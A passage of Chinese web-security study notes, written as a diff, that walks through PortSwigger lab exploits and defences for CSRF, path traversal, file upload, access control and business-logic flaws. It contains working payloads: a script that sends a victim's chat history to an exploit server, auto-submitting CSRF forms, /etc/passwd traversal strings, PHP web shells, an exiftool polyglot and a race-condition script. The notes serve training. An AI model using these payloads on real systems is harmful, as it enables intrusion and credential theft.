%6c%6f%67%3d%27%20%2b%20%64%61%74%61%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=xxxxxx';
+  </script>
+  ```
+
+* 查看 exploit 服务器日志
+
+  ```
+  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22You%22%2C%22content%22%3A%22I%20forgot%20my%20password%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
+  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22CONNECTED%22%2C%22content%22%3A%22--%20Now%20chatting%20with%20Hal%20Pline%20--%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
+  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22You%22%2C%22content%22%3A%22Thanks%2C%20I%20hope%20this%20doesn%26apos%3Bt%20come%20back%20to%20bite%20me!%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
+  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22No%20problem%20carlos%2C%20it%26apos%3Bs%20foib1pv0baqzaxe0lr26%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
+  10.0.4.182      2026-08-28 07:20:21 +0000 "GET /exploit?log=%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22Hello%2C%20how%20can%20I%20help%3F%22%7D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
+  ```
+
+* 解码上面日志中内容，是受害者的聊天记录，其中包含其账号密码，登录后解决 LAB
+
+
+
+### Referer-based 
+
+有些应用使用 HTTP header 中的  referer 字段来尝试防御 CSRF 攻击，但这种方法效果不好，通常容易被绕过。  
+
+portswigger 示例：
+
+```html
+<html>
+    <form action="https://0ae400300445a8fc83277d4f005300ef.web-security-academy.net/my-account/change-email" method="POST">
+        <meta name="referrer" content="never">
+        <input type="hidden" name="email" value="victim@hacker.com">
+    </form>
+    <script>
+        document.forms[0].submit();  // auto submit when page loaded
+    </script>
+</html>
+```
+
+
+
+**两种常见的“幼稚”（Naive）校验逻辑及绕过方式**   
+
+有些网站会判断 referer 中是否包含自己的域名，可以通过如下方法绕过：
+
+```html
+<html>
+    <form action="https://0a460069045eca3d801e62680069008f.web-security-academy.net/my-account/change-email?" method="POST">
+        // 默认浏览器会将 URL 中的查询字符串移除然后填入 referer 字段中，主要为了保护隐私
+        // Referrer-Policy: unsafe-url 是告诉浏览器发送 Referer 时不需要任何裁剪，给我把完整的 URL 原样发出去
+        <meta name="referrer" content="unsafe-url">
+        <input type="hidden" name="email" value="victim@hacker.com">
+    </form>
+    <script>
+        // history.pushState() 这个方法可以在 URL 中添加查询参数，例如 ?foor=bar 这种，这样在受害者访问 expolit 服务器时会加上下面的后缀，服务器判断逻辑仅验证是否包含当前域名，过于简单就被绕过了
+        history.pushState('', '', '/?https://0a460069045eca3d801e62680069008f.web-security-academy.net');
+        document.forms[0].submit();  // auto submit when page loaded
+    </script>
+</html>
+
+```
+
+有一些校验逻辑是验证域名前缀是否匹配，可以通过配置包含目标 URL 域名作为子域名方式绕过。  
+
+例如校验逻辑如下：
+
+```
+starts_with('vulnerable-website.com')
+```
+
+可以通过配置如下子域名去绕过校验：
+
+```
+http://vulnerable-website.com.attacker-website.com/csrf
+```
+
+
+
+
+
+
+
+
+
+### 如何预防 CSRF
+
+主要还是上面提到的 CSRF-Token 和 SameSite 策略。  
+
+**生成**  
+
+CSRF Token 要遵循这几条准则：
+
+* 具有高熵的不可预测，与常规会话生成要求一样
+  * 使用加密安全的伪随机数生产器（Cryptographically Secure Pseudo-random Number Generator,CSPRNG），加上时间戳相关作为 seed 进行初始化
+  * 如果需要比 CSPRNG 更强的加密性，可以将 CSPRNG 与用户相关的特定熵组合拼接后，再进行 hash 运算生成令牌。
+* 关联到用户会话
+* 在关联动作执行之前，每种场景都要严格验证
+
+
+
+**传输**  
+
+CSRF token 应当被视为 Secrets ，并在其存在的整个生命周期中安全处理。一种通常有效的方式是将令牌存放在 POST 提交的 HTML 表单中的隐藏字段中传输给客户端，客户端提交时该参数会被包含在其中，例如：
+
+```html
+<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
+```
+
+CSRF token 字段应该尽量在 HTML 文档的前面，理想情况下存放在任何非隐藏输入字段、用户可控的输入数据之前，以缓解攻击者构造数据操控 HTML 来获取数据。  
+
+还有一种存放在 URL 中的方式安全性较差，因为：
+
+* 字符串会在浏览器和服务器中多个位置被记录
+* 容易通过 HTTP Referer 头传输给第三方
+* 可能展示在用户屏幕浏览器上
+
+有些应用通过在自定义 header 中传输 CSRF token。由于浏览器通常不允许跨域发送自定义 header ，因此加强了防御。但这种方法限制了应用只能使用 XHR 来发起受 CSRF token 保护的请求，增加了复杂度。  
+
+CSRF token 不应该随着 token 一起传输。  
+
+
+
+**验证**  
+
+CSRF token 生成后存放在服务端的用户 session 数据中，后续收到需要验证的请求，服务器应用验证该请求是否包含一个用户会话中存储的值相匹配的 token，无论请求的方法或内容类型是什么，都应该执行此验证。如果请求未包含 token，则应该用和无效 token 时一样的方式拒绝该请求。      
+
+
+
+**SameSite 策略**  
+
+除了 CSRF token 之外，建议为每个 cookie 明确设置 SameSite 策略，这样无论浏览器默认策略如何，都会减少不一致的情况。理想情况下使用 strict 策略，有足够理由明确需要时才修改为 Lax 策略。  
+
+虽然 SameSite 为跨站攻击提供防护，但对于跨源、同站攻击无效。   
+
+如果可以将不安全的内容隔离在单独站点（例如用户上传的文件），远离敏感功能或数据。测试一个网站时，全面审计同一个站点的所有可能的攻击面，包括兄弟域名。  
+
+
+
+
+
+
+
+## Path traversal 目录遍历
+
+Path traversal 又称 Directory traversal，有翻译为目录遍历、路径穿越、路径遍历，会导致攻击者读取服务器上的任意数据，可能包括：代码和数据、后端凭证、系统敏感文件。一些场景中还可以写入文件，导致修改应用数据或者属性，最终拿到服务器权限。  
+
+下面是一些常见的漏洞：
+
+* 经过路径读取任意文件
+  * 例如：代码中使用`<img src="/loadImage?filename=218.png">`来展示存放在`/var/www/html`中的图片，如果没有合适的权限配置，可能导致攻击者通过 `https://insecure-website.com/loadImage?filename=../../../etc/passwd` 一类的URL请求以 `/var/www/images/../../../etc/passwd` 这种形式访问但敏感文件。基于windows的可能使用`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini` 这种形式。
+* 一些应用使用了一些常见的手段防御，但存在可以绕过的漏洞
+* 限制了相对路径
+  * 但是使用绝对路径访问，例如参数为 `filename=/etc/passwd`
+  * 限制了只能以 `/var/www/html` 开头，但是仍然存在 `../` 这种形式的绕过
+  * 限制了文件后缀，例如 `.png` ，但可以通过 `filename=../../../etc/passwd%00.png` 这种形式绕过
+* 限制了 `../` 这种形式，但可以通过`....//` 或者 `....\/` 绕过，或者 `%2e%2e%2f` 、 `%252e%252e%252f`、`..%c0%af`、`..%ef%bc%8f` 这种转义绕过
+
+
+
+
+
+
+
+
+
+## File Upload 文件上传
+
+当一个网站应用允许用户上传到文件系统中，但没有足够的检查手段，就会导致恶意文件上传漏洞，攻击者可能会利用该漏洞上传服务端脚本开启远程代码执行。  
+
+### 影响
+
+文件上传漏洞的影响一般取决于这些因素：
+
+* 网站未能正确验证文件的哪些方面，大小、类型、内容等对此的影响各不相同
+* 对于上传成功的文件的限制
+
+在最坏的情况下，
+
+* 如果对类型没有正确验证会导致上传 `.php` 、`.jsp` 之类的可执行代码，
+* 文件名未能正确验证会导致非法文件被上传覆盖正常文件，甚至通过路径穿越的形式上传到有权限的系统位置
+* 文件大小未能正确验证，可能会导致磁盘被占满，潜在的 DOS(denial-of-service)。
+
+
+
+### 产生原因
+
+
+
+
+
+### 简单利用示例
+
+最坏的场景下，文件上传功能没有做任何限制，导致可以上传可执行代码类型的文件。  
+
+例如：
+
+* php 代码 `<?php echo file_get_contents('/path/to/target/file'); ?>` ，一旦这个文件被上次就可以读取指定目录中文件数据。
+* 更常见的是结合URL的系统命令执行，上传文件包含类似：`<?php echo system($_GET['command']); ?>` 的内容，攻击者通过 `GET /example/exploit.php?command=id HTTP/1.1` 这种形式调用
+
+
+
+### 常见漏洞
+
+#### 文件类型校验缺陷
+
+很多场景下上传文件的 html 是使用 `POST` 方法上传 `application/x-www-form-urlencoded` 上下文类型（content type），对于图片、PDF 等二进制文件，通常使用 `multipart/form-data` 上下文类型。  
+
+示例请求：
+
+```http
+POST /images HTTP/1.1
+    Host: normal-website.com
+    Content-Length: 12345
+    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="image"; filename="example.jpg"
+    Content-Type: image/jpeg
+
+    [...binary content of example.jpg...]
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="description"
+
+    This is an interesting description of my image.
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="username"
+
+    wiener
+    ---------------------------012345678901234567890123456--
+```
+
+上面请求中使用 `Content-Disposition` 分割每一段内容，每段单独有一个 `Content-Type` 指定数据类型，当服务器以来此字段判断文件类型而不检查文件内容时，就会存在漏洞，导致恶意文件被上传。
+
+
+
+
+
+#### 阻止文件执行
+
+作为一种预防手段，服务器可以配置仅执行 MIME 类型的脚本，其他类型文件返回错误或者直接将内容以消息形式返回。
+
+示例：
+
+```http
+GET /static/exploit.php?command=id HTTP/1.1
+    Host: normal-website.com
+
+
+    HTTP/1.1 200 OK
+    Content-Type: text/plain
+    Content-Length: 39
+
+    <?php echo system($_GET['command']); ?>
+
+```
+
+这种手段能最大程度上禁止 web shell 的创建，但容易存在泄露源码的风险。  
+
+
+
+
+
+
+
+#### 文件类型黑名单设置不充分
+
+
+
+##### 覆盖服务器配置
+
+例如假设 apache 服务器允许上传 `.htaccess` 类型的文件，攻击者上传了如下内容：
+
+```
+AddType application/x-httpd-php .jpg
+```
+
+攻击者将如下内容伪装成 jpg 类型文件上传：
+
+```
+<?php echo system($_GET['command']); ?>
+```
+
+由于 apache 会将目录下 `.htaccess` 文件中规则替换掉全局规则，这会导致将 .jpg 类型文件作为 .php 发送给解释器执行。
+
+
+
+##### 混淆文件扩展名
+
+即使黑名单设置的很详尽，也可能通过混淆技术被绕过。简单的示例：假设黑名单代码是区分大小写的，且未能检查出 `exploit.pHp` 是 `.php` 文件，就会被绕过。还有很多种类型：
+
+* 提供多个扩展，取决于解析扩展名的算法，例如 `exploit.php.jpg` 
+* 尾字符，有些组件会忽略结尾的 `.` 或者空格，例如 `exploit.php.` 
+* 利用 URL 编码，例如 `exploit%2Ephp`
+* 在文件结尾前添加分号或者URL编码的 null 字符，如果黑名单验证使用 php、java 等语言，但服务器处理文件又用的 C、C++ 等偏底层语言，文件名结尾的处理可能产生差异，例如 `exploit.asp;.jpg` 或者 `exploit.asp%00.jpg`
+* 尝试使用多字节 unicode 编码，例如使用 UTF8 解析文件名 `xC0 x2E`, `xC4 xAE` 或者 `xC0 xAE` 可能被转换为 `x2E`
+* 有些措施会剥离危险的扩展名，例如 `.php` ，但如果没有递归处理文件，可能会被 `exploit.p.phphp` 这种绕过
+
+
+
+
+
+#### 文件内容验证缺陷
+
+一些对安全要求较高的应用会校验文件内容，例如 jpg 等图片文件有属性：尺寸大小，而如果攻击者上传 .php 之类的文件伪装则不存在此类属性从而被拒绝。但可以通过修改文件元属性等方式绕过检测。  
+
+例如 exiftool，下面示例是以 shell.jpeg 为源文件，向元数据的 comment 中插入php代码数据获取密钥，生成 polyglot.php 
+
+```
+.\exiftool.exe -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" shell.jpeg -o polyglot.php
+```
+
+
+
+
+
+#### 文件上传条件竞争
+
+现代 web 框架对上面几类攻击都有了更强的防御能力，通常会将文件上传到一个临时目录或者沙箱中，然后随机化文件名并加以验证，确认安全后再进行转移到目标位置。  
+
+但有时候开发人员仍需要独立于框架之外，实现一些文件上传的处理逻辑，由此可能会带来条件竞争的问题，使得攻击者绕开这些验证防御。  
+
+例如，网站上传文件到文件系统中，然后利用杀毒软件之类工具对该文件进行验证，未通过则删除文件，即使通常只有几秒甚至几毫秒的存在时间，黑客仍有可能执行到该文件。  
+
+一般此类漏洞极为隐蔽，黑盒测试中很难发现，除非找到泄露的源码。
+
+
+
+portswigger 实验中漏洞代码：
+
+```php
+<?php
+$target_dir = "avatars/";
+$target_file = $target_dir . $_FILES["avatar"]["name"];
+
+// temporary move
+move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);
+
+if (checkViruses($target_file) && checkFileType($target_file)) {
+    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
+} else {
+    unlink($target_file);
+    echo "Sorry, there was an error uploading your file.";
+    http_response_code(403);
+}
+
+function checkViruses($fileName) {
+    // checking for viruses
+    ...
+}
+
+function checkFileType($fileName) {
+    $imageFileType = strtolower(pathinfo($fileName,PATHINFO_EXTENSION));
+    if($imageFileType != "jpg" && $imageFileType != "png") {
+        echo "Sorry, only JPG & PNG files are allowed\n";
+        return false;
+    } else {
+        return true;
+    }
+}
+?>
+```
+
+只要在 checkViruses 方法执行期间访问了上传的文件，文件内容仍会被执行。  
+
+官方给的实验答案（手快一些也可以开两个浏览器页面，手工上传后访问测试）：
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
+
+    request1 = '''<YOUR-POST-REQUEST>'''
+
+    request2 = '''<YOUR-GET-REQUEST>'''
+
+    # the 'gate' argument blocks the final byte of each request until openGate is invoked
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race1')
+
+    # wait until every 'race1' tagged request is ready
+    # then send the final byte of each request
+    # (this method is non-blocking, just like queue)
+    engine.openGate('race1')
+
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+
+
+
+
+
+
+### 无远程代码执行的文件上传漏洞
+
+前面都是可以上传远程执行代码相关的漏洞，还有一些虽然不能触发远程代码执行漏洞，但也可以通过其它方式被利用：
+
+* 上传恶意的客户端执行脚本：攻击者在上传的 HTML、SVG 图片等资源中加入`<script>` 之类内容，用于 XSS 攻击。
+* 利用文件解析或处理的漏洞，例如常见的 XML、doc、xls 等，用于 XXE 攻击。
+
+
+
+
+
+### 利用 PUT 上传
+
+有些 web 服务器或者框架默认配置支持了 PUT 请求，这样即使没有 web 页面用于上传文件，也会存在潜在的通过 PUT 请求上传文件漏洞。
+
+示例：
+
+```http
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+```
+
+一般可以给不同后端端点发送 `OPTIONS` 请求探测是否支持 `PUT` 方法。  
+
+
+
+### 预防文件上传漏洞
+
+文件上传相关最佳实践：
+
+* 文件后缀白名单优于黑名单
+* 检查文件名中不包含 `../` 之类的可以穿透目录的字符串
+* 重命名文件以避免覆盖现有文件
+* 文件被验证安全之前不上传到服务器文件系统中
+* 优先使用成熟框架来处理文件上传功能，尽量避免自己写相关验证机制
+
+
+
+
+
+
+
+## Access Control/ IDOR 访问控制失效
+
+
+
+### 概念
+
+访问控制是约束用户可以执行被授权的动作、可访问授权的资源。
+
+* Authentication 验证用户身份
+* Session management 标识通过验证的用户，用于后续的其它请求
+* Access control 访问控制在用户执行操作时验证他们拥有的权限
+
+
+
+#### Vertical access controls 垂直访问控制
+
+不同级别角色用户的权限，例如普通用户、管理员、超级管理员。
+
+
+
+#### Horizontal access controls 水平访问控制
+
+不同用户的权限，例如A用户、B用户，只能访问属于自己的资源。
+
+
+
+#### Context-dependent access controls 依赖上下文的控制
+
+依赖于上下文状态的访问控制，例如根据是否购买会员展示不同内容、购物车下单依赖商品库存状态等。
+
+
+
+
+
+### 访问控制失效常见类型
+
+#### Vertical privilege escalation 垂直提权
+
+如果用户能够获取或者访问到未授权的功能、资源，就属于垂直提权。  
+
+
+
+常见漏洞类型：
+
+* Unprotected functionality：没有对敏感功能进行限制访问，或者在一些资源中存在泄露，示例：
+
+  * 任何用户都可以访问 `https://insecure-website.com/admin ` 
+  * 将管理 url 卸载了robots 中，`https://insecure-website.com/robots.txt` 
+  * 管理URL做了一些随机化处理，例如 `https://insecure-website.com/administrator-panel-yb556`，但是在一些资源中会泄露地址，例如帖子、评论等功能中展示管理地址
+
+* Parameter-based access control：一些应用将在验证用户权限或者角色后，将下一步处理的信息参数化，存放在用户可以控制的位置，例如
+
+  * 隐藏元素中，例如配置了 hidden 属性的 input 元素
+
+  * cookie 中
+
+  * 参数集合
+
+    * 示例：
+
+    ```
+    https://insecure-website.com/login/home.jsp?admin=true
+    https://insecure-website.com/login/home.jsp?role=1
+    ```
+
+* Platform misconfiguration：一些应用针对用户角色限制了 URL 、HTTP 请求方法，这种情况下各种出错都可能导致访问控制被绕过。
+
+  * 例如 `DENY: POST, /admin/deleteUser, managers` 这样一条配置限制了非 managers 组中的用户提交 POST 请求到该 URL。
+
+  * 一些应用框架支持非标准的 HTTP 请求头，可以覆盖 HTTP 请求中的 URL，例如 `X-Original-URL` 和 `X-Rewrite-URL`。在这种场景下，可以使用如下请求绕过
+
+    ```http
+    POST / HTTP/1.1
+    X-Original-URL: /admin/deleteUser
+    ...
+    ```
+
+  * 一些框架支持同一接口处理多种类型的请求，自动进行转换，此时访问控制可以通过 `GET` 请求被绕过。
+
+* URL-matching discrepancies：网站传入的请求和定义的 endpoint 匹配时，可能存在差异：
+
+  * 大小写不一致会被认为同一端点，但访问控制可能遗漏，此时就会被绕过
+  * 对结尾`/`分隔符处理的不同，也可能被利用来绕过
+
+
+
+
+
+#### Horizontal privilege escalation 水平提权
+
+水平提权是指通过漏洞访问到不属于自身用户的资源。  
+
+可以使用与垂直提权类似的利用方法：
+
+* 利用参数，例如：`https://insecure-website.com/myaccount?id=123` 这个 URL 通过传送的 id 来判断用户身份，修改id 后会进入其它用户视图
+
+* 有的网站使用 hash 用户 id，以避免被攻击者猜测出来，但存在泄露 id 的功能或者页面，例如评论、博客作者之类，或者在一些页面中隐藏用户 id 用于其它功能。
+
+  
+
+
+
+#### Horizontal to vertical privilege escalation 水平提权到垂直提权
+
+如果通过水平提权获取到高等级用户的账户，例如管理员，就属于水平提权转变为垂直提权。  
+
+​	
+
+#### Insecure Direct Object Reference(IDOR) 不安全对象引用
+
+当应用通过用户的输入来直接访问对象时，就可能出现 IDOR 漏洞，曾经在 OWASP 2007 TOP Ten 列表。  
+
+示例：
+
+* 直接引用数据库对象漏洞，一个使用 URL 检索数据库来访问用户页面，例如 `https://insecure-website.com/customer_account?customer_number=132355` ,如果没有其它限制，通过修改 `customer_number` 的值就可以查看其它用户页面。  
+* 直接引用静态文件漏洞，假设某网站将聊天信息使用递增顺序的文件名保存到磁盘上，允许用户通过下载文件来检索记录，例如`https://insecure-website.com/static/12144.txt` ，攻击者修改文件名就可以检索其它用户数据。
+
+
+
+#### 多步骤处理漏洞
+
+很多网站的重要功能实现会被拆分为多个步骤，通常发生在：
+
+* 页面存在多个输入值或者选项
+* 提交之前用户需要检查、确认
+
+示例，管理员页面存在更新用户权限的功能，由如下步骤组成：
+
+* 加载包含用户现有详情信息的表单
+* 点击提交按钮
+* 检查改动内容并确认
+
+假设在前两步都进行了严格的权限校验，但在第三步遗漏了，攻击者就可以利用此步骤来获取未授权的操作。  
+
+
+
+#### 基于 referer 的访问控制
+
+一些网站基于 `Referer` 头参数来判断是否有权限。例如对 `/admin/deleteUser` 发起一个请求，如果 `Referer` 是来自 `/admin` 则放行，这样就给攻击者留下了漏洞，通过控制 `Referer` 的值来绕过验证。  
+
+
+
+#### 基于地理位置的访问控制
+
+根据不同国家、省市(州)的法律法规，有些应用会限制访问来源的地理位置，通常可以通过代理、VPN 等手段绕过。  
+
+
+
+### 预防
+
+
+
+* 永不依赖代码混淆作为权限控制
+* 除了打算做为公共访问的资源，其它资源默认拒绝访问
+* 尽可能使用单一应用范围内的强制访问控制
+* 在代码层面，强制要求开发人员为每个资源声明访问控制权限，并配置为默认拒绝
+* 全面详细的检查和测试，确保访问控制符合设计预期
+
+
+
+
+
+## Business logic 业务逻辑漏洞
+
+
+
+### 产生原因和影响
+
+通常是设计和开发团队对用户和应用之间的交互做了有缺陷的假设，可能是验证输入不充分、逻辑不够严谨等。越复杂的系统越容易出现，当多个模块的设计者或开发人员对其它交互的组件理解不深，做出一些错误假设，无意之间就会引入严重逻辑缺陷。业务逻辑漏洞的影响和功能相关，可能很轻微，也可能很严重，例如认证、金融交易之类的漏洞通常容易产生严重影响。  
+
+
+
+  
+
+常见的错误假设有：
+
+* 用户只会用浏览器
+* 用户不会修改隐藏元素字段
+* 用户会按照顺序执行
+* 用户不会重复提交
+* 用户不会输入负数
+
+
+
+复杂系统出现逻辑漏洞的主要原因：
+
+* 代码量庞大
+* 团队分工导致彼此了解不足
+* 未文档化
+* 功能交互复杂
+* 测试覆盖不足
+
+
+
+常见避免逻辑漏洞的方法：
+
+* 服务端校验所有输入，永远不信任客户端
+* 明确文档化假设，将所有认为“用户会...”的假设记录下来
+* 整体性理解，开发者要了解自己模块之外的内容
+* 异常路径测试
+* 代码审查
+* 状态机管理，多步骤流程用状态机，拒绝非法状态转换
+
+
+
+
+
+### 示例
+
+#### 过度信任客户端控制
+
+参考 Authentication 中的多因子实验。
+
+#### 处理异常输入的缺陷
+
+实验一：购物车没有对减去商品数量做剩余数量检查，当购物车中不存在该商品时仍处理请求，通过 burpsuite 拦截修改，利用 Repeat 发送多个减去商品的请求，使得购物车中商品数量出现了负值，再加上其它商品就可以凑出较小金额进行下单。
+
+
+
+实验二：整数溢出，购物车应用的总价使用有符号32位整数来存储，超过整数最大范围会溢出变为负值，虽然做了负值校验，不能下单，但是通过构造请求，让购物车的值恰好超过0值一些，可以完成使用少量余额下单。
+
+
+
+实验三：应用程序对邮件地址的处理存在“不一致”：发送确认邮件的邮件服务器会使用完整的地址，而用于权限判断的应用程序后端则会把地址截断到 **255 个字符**，构造一个超长邮箱，让后端误以为是内部员工，但邮件会发送到攻击者的域名邮箱中：
+
+```
+wienerpeterxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxrxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxrxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@dontwannacry.com.exploit-0aea0039047564aa8377000901b00068.exploit-server.net
+```
+
+
+
+
+
+#### 对用户行为的假设
+
+* Trusted users won't always remain trustworthy
+  * 实验示例：根据用户邮箱后缀判断是否为内部用户，但未对注册成功的外部用户修改邮箱做校验，导致可以修改为内部邮箱，从而访问管理页面
+* Users won't always supply mandatory input
+  * 实验示例：修改密码时传递当前密码，会对比当前密码是否正确，但是未传递当前密码也可以修改成功
+* Users won't always follow the intended sequence
+  * 实验示例：用户登录需要通过双因子，密码+邮箱验证码，攻击者已经获取到B用户密码，使用自己的A用户登录后发送验证码进行验证，进入账户主页记住URL并登出自己账号，使用B用户账号登录，在双因子验证页面，手动修改URL为之前记录的URL值
+  * 有时候按照非预期的顺序提交请求去测试程序，尝试跳过不同步骤中的请求、删除部分参数、返回早期的步骤、重复某些步骤等，这种测试通常会引发异常，要密切关注异常和错误信息，看程序是否存在漏洞或攻击面。
+  * 实验示例，非预期顺序：当购物车中有物品，手工修改URL为 `cart/order-confirmation?order-confirmed=true` 访问确认页面，服务器就认为已经成功付款。
+  * 实验示例，Authentication 状态机缺陷：服务器维护了一个状态机，假设用户登录的顺序为：输入账号密码、选择角色、进入账号主页，可能在内存或者 session 中维护了状态变量，但未作非法状态转换检测，用户登录后跳过选择角色步骤，直接强制访问 `/admin` 管理页面，服务器没有阻止并使用默认角色初始化用户状态，导致用户获取管理功能。 
+    * 正常流程：`POST /login` → `GET /role-selector` → `POST /role-selector` → `GET /my-account`.
+    * 攻击流程：`POST /login` → `GET /admin`（跳过中间的角色选择步骤）.
+    * 根本原因：服务器没有在访问 `/admin` 时校验用户是否已经完成了角色选择。它错误地信任了“用户访问 `/admin` 就意味着他们已经完成了前面的步骤”。当这个假设不成立时，服务器会使用一个未初始化的默认状态，而这个状态恰好拥有过高的权限。
+
+
+
+#### 特定领域缺陷
+
+示例实验一：反复利用不同优惠券减直到余额为零。
+
+
+
+
+
+示例实验二：利用优惠券折扣购买礼品卡，再使用礼品卡，无限刷余额。
+
+
+
+
+
+#### 提供加密预言机
+
+当用户可控的输入被加密，并且生成的密文以某种形式提供给用户。就可能出现危险的场景，被称为“encryption oracle(加密预言机)”（在密码学中，指一个能对任意输入返回加密结果的黑盒系统）。攻击者可以利用这个输入加密任意数据，当应用程序存在一个反向功能的可控输入，攻击者甚至能够解密其他数据识别结构。  
+
+
+
+实验示例：
+
+一个博客应用，登录界面有一个保持登录功能，如果勾选，会传递一个 stay-logged-in=on 参数：
+
+```http
+POST /login HTTP/2
+Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
+Cookie: session=TFWkrJlgS9eTbtnRdLPha12l0RTZxNFL
+
+...omit...
+
+csrf=WKJ2oZS9bxbRpkjVMYhEGe4v0rYR4cfy&username=wiener&password=peter&stay-logged-in=on
+```
+
+返回的cookie 中则包含了 stay-logged-in 的条目，是一个加密字符串：
+
+```http
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+Set-Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; Expires=Wed, 01 Jan 3000 01:00:00 UTC
+Set-Cookie: session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY; Secure; HttpOnly; SameSite=None
+... omit ...
+
+```
+
+
+
+在文章提交评论的接口，将评论内容以 POST 方法参数提交
+
+```http
+POST /post/comment HTTP/2
+Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
+Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
+Content-Length: 120
+
+... omit ...
+
+csrf=oRFcBXMXzfDCKBgYKbko0GxepdqQuh56&postId=6&comment=comment+content&name=title&email=a%40b.c&website=http%3A%2F%2Fd.e
+```
+
+正常返回：
+```http
+HTTP/2 302 Found
+Location: /post/comment/confirmation?postId=6
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+
+```
+
+如果填写错误邮箱地址，页面会提示：`Invalid email address: xxxxxx`，返回的 cookie 中包含了 notification，即加密后的通知内容，如果有 notification，例如上面邮箱格式错误，html 页面会根据下面 cookie  解码成明文`Invalid email address: wrong_address`。
+
+```http
+HTTP/2 302 Found
+Location: /post?postId=6
+Set-Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbK58%2fJyS3dBtdLuag8x4zxQdHf2OEZ1pTbgXxDTRFjrP; HttpOnly
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+这个评论功能就属于加密预言机：
+
+* 加密：将我们想要加密的字符串通过邮箱参数传递给此接口，返回的 cookie 中包含了加密字符串
+
+* 解密：将符合格式的密文配置到 cookie 中的  notification 字段，请求对应文章页面，会展示在通知区域
+
+  * 例如 
+
+    ```http
+    GET /post?postId=6 HTTP/2
+    Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
+    Cookie: notification=AFfitMYDEfxvYVJSKNG%2fbK58%2fJyS3dBtdLuag8x4zxQdHf2OEZ1pTbgXxDTRFjrP; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
+    ```
+
+    
+
+通过访问不同页面，可以发现服务端判断用户登录状态是基于 stay-logged-in 这个字段，尝试将这个字段作为参数 notification 的值以 url 形式解码后传递给解密页面：
+
+```http
+GET /post?postId=6 HTTP/2
+Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
+Cookie: notification=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0=; stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
+```
+
+得到结果是：
+
+```html
+<header class="notification-header">
+    wiener:1789885263983                    
+</header>
+```
+
+可以发现是`用户名:时间戳`的形式，如果可以解密`administrator:时间戳` 就可以以管理员身份登录管理页面。    
+
+在评论功能的接口提交请求：
+
+```http
+POST /post/comment HTTP/2
+Host: 0ac70027049ea2f680a3c17a00de003e.web-security-academy.net
+Cookie: stay-logged-in=c3rSmy2rF9W6EJfNGUiK0fBovK8PSlMb4OYV0wyn2j0%3d; session=S3Avf9a3bLwAnN5azuskchUVq7qQyNsY
+
